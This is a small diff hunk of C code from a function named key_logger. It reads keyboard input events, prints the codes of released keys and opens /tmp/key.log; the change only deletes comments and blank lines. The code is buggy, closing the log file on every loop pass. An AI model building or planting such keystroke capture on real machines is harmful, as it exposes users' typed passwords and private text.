@@ -32,15 +32,11 @@ void key_logger()
 	printf("%d\n", fd);
 	FILE *log = fopen("/tmp/key.log", "a");
 	while (1) {
-		//printf("Started\n");
 		read(fd, &ev, sizeof(ev));
 		fflush(stdout);
 		fclose(log);
-
-		
 		if (ev.type == EV_KEY && ev.value == 0)
 			printf("%d\t", ev.code);
-		//printf("End\n");
 	}
 }
 
